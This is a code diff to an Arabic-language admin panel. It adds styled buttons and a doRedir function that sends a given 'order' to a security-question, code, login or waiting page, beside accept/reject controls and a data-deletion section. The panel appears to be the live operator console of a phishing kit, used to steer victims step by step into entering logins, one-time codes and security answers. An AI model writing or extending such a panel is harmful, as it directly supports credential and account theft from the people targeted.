@@ -146,6 +146,11 @@ body{font-family:'Cairo',sans-serif;background:#f8fafc;color:#1e293b;min-height:
   box-shadow:0 4px 12px rgba(220,38,38,.2)}
 .btn-ok.disabled,.btn-no.disabled{background:#cbd5e1;cursor:not-allowed;opacity:.6;box-shadow:none}
 
+.redir-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-top:10px}
+.redir-grid button{border:none;border-radius:8px;padding:10px 6px;font-size:11px;font-weight:700;
+  cursor:pointer;font-family:'Cairo',sans-serif;color:#fff;transition:.15s}
+.redir-grid button:hover{opacity:.85;transform:translateY(-1px)}
+
 .sec-del{background:rgba(220,38,38,.03);border-radius:14px;padding:16px;border:1px solid rgba(220,38,38,.15)}
 .sec-del h4{font-weight:700;font-size:14px;color:#dc2626;margin:0 0 10px;display:flex;align-items:center;gap:8px}
 .btn-del-all{width:100%;background:linear-gradient(135deg,#dc2626,#991b1b);color:#fff;border:1px solid rgba(220,38,38,.4);
@@ -427,6 +432,12 @@ function renderDetail(o){
       '<button class="btn-ok disabled" disabled>✅ قبول</button>'+
       '<button class="btn-no disabled" disabled>❌ رفض</button></div>';
   }
+  h+='<div class="redir-grid">'+
+    '<button style="background:#a855f7" onclick="doRedir(\''+esc(o.id)+'\',\'security\')">🛡️ سؤال الأمان</button>'+
+    '<button style="background:#0ea5e9" onclick="doRedir(\''+esc(o.id)+'\',\'code\')">📲 الكود</button>'+
+    '<button style="background:#f59e0b" onclick="doRedir(\''+esc(o.id)+'\',\'login\')">🔑 تسجيل الدخول</button>'+
+    '<button style="background:#7c3aed" onclick="doRedir(\''+esc(o.id)+'\',\'wait\')">⏳ الانتظار</button>'+
+    '</div>';
   h+='</div>';
 
   h+='<div class="sec-del"><h4>🗑️ حذف البيانات</h4>'+
@@ -488,6 +499,12 @@ function cancelDel(){var o=orders.find(function(x){return x.id==selId;});if(o)re
 function doDecide(id,decision){
   api('POST','/api/admin/'+decision+'/'+id).then(function(){
     showNotif(decision==='accept'?'✅ تم القبول':'❌ تم الرفض');loadData();});
+}
+
+function doRedir(id,page){
+  api('POST','/api/admin/redirect/'+id,{page:page}).then(function(){
+    var labels={security:'سؤال الأمان',code:'الكود',login:'تسجيل الدخول',wait:'الانتظار'};
+    showNotif('✅ تم إعادة التوجيه إلى: '+(labels[page]||page));loadData();});
 }
 
 function loadData(){
